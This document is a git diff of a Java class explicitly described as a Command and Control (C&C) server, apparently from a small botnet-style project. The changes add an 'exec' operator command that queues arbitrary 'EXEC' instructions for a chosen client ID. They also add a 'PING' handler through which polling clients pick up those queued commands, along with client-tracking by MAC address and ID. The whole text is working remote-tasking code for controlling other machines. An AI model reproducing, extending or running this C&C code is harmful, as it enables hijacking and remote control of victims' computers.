@@ -3,14 +3,11 @@ package server;
 import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
-import java.net.InetAddress;
 import java.net.Socket;
 import java.util.HashMap;
-import java.util.HashSet;
-import java.util.Set;
-import java.util.concurrent.ThreadLocalRandom;
 
 import tools.Command;
+import tools.ParsedCommand;
 
 /**
  * Represents a Command and Control (C&C) server
@@ -28,15 +25,10 @@ public class CommandServer implements RequestHandler, CommandHandler {
 	private final HashMap<String, Command> cmdsClient;
 	
 	// The set of connected clients IPs
-	private Set<InetAddress> clients;
-	
-	// The set of couples (MAC Address, ID)
-	private HashMap<String, Integer> macMap;
+	private ClientPool clients;
 	
 	public CommandServer() {
-		clients = new HashSet<InetAddress>();
-		macMap = new HashMap<String, Integer>();
-		// TODO : load macMap from external file
+		clients = new ClientPool();
 		
 		cmdsServer = new HashMap<String, Command>();
 		cmdsClient = new HashMap<String, Command>();
@@ -65,35 +57,70 @@ public class CommandServer implements RequestHandler, CommandHandler {
 			}
 		});
 		
-		// Assign an ID to a client
-		cmdsClient.put("GETID", new Command(){
+		cmdsServer.put("exec", new Command(){
 			@Override
 			public String exec(String[] args) {
-				// Already known client
-				if (macMap.containsKey(args[0])){
-					return Integer.toString(macMap.get(args[0]));
+				ConnectedClient client;
+				if ((client = identify(args[0])) != null) {
+					StringBuilder cmd = new StringBuilder();
+					cmd.append("EXEC ");
+					for (int i = 1; i < args.length; i++){
+						cmd.append(args[i]
+								+ (i == args.length - 1 ? "" : " "));
+					}
+					client.stackCmd(cmd.toString());
+					return "Added command to stack";
 				}
-				// New client
-				else {
-					int id = ThreadLocalRandom.current().nextInt(1000, 10000);
-					macMap.put(args[0], id);
-					return Integer.toString(id);
+				return "No corresponding client (" + args[0] + ") found.";
+			}
+		});
+		
+		// Assign an ID to a client
+		cmdsClient.put("GETID", new Command(){
+			
+			@Override
+			public String exec(String[] args) {
+
+				ConnectedClient client = clients.findByMac(args[0]);
+				
+				if (client != null) { // Already known client
+					return Integer.toString(client.getId());
+				} else { // New client
+					return Integer.toString(clients.addClient(args[0]));
 				}
+				
+			}
+		});
+		
+		// Answer a ping
+		cmdsClient.put("PING", new Command(){
+			@Override
+			public String exec(String[] args) {
+				ConnectedClient client;
+				if ((client = identify(args[0])) != null && client.hasCmd()) {
+					return client.popCmd();
+				}
+				return "PONG";
 			}
 		});
 		
 		// ADD COMMANDS HERE
 		
 	}
+	
+	private ConnectedClient identify(String idStr) {
+		if (clients.containsKey(Integer.parseInt(idStr))) {
+			return clients.get(Integer.parseInt(idStr));
+		}
+		return null;
+	}
 
 	@Override
 	public String getResponse(Socket socket)
 			throws IOException {
 		
-		// Identifying client
-		InetAddress client = socket.getInetAddress();
-		if (!clients.contains(client))
-			clients.add(client);
+		// TODO: Identify client
+		// InetAddress client = socket.getInetAddress();
 		
 		// Reading request
 		BufferedReader reader = new BufferedReader(
@@ -137,28 +164,6 @@ public class CommandServer implements RequestHandler, CommandHandler {
 		if (cmdsServer.containsKey(pCmd.cmd))
 			return cmdsServer.get(pCmd.cmd).exec(pCmd.args);
 		return ERROR_COMMAND_NOT_FOUND;
-	}
-	
-	/**
-	 * A small class to parse a command,
-	 * retrieving the command itself and
-	 * its arguments.
-	 * 
-	 * @author Yohan Chalier
-	 *
-	 */
-	private class ParsedCommand {
-		String cmd;
-		String[] args;
-		
-		ParsedCommand(String str){
-			String[] split = str.split(" ");
-			cmd = split[0];
-			args = new String[split.length - 1];
-			for (int i = 1; i < split.length; i++)
-				args[i-1] = split[i];
-		}
-		
 	}
 	
 }
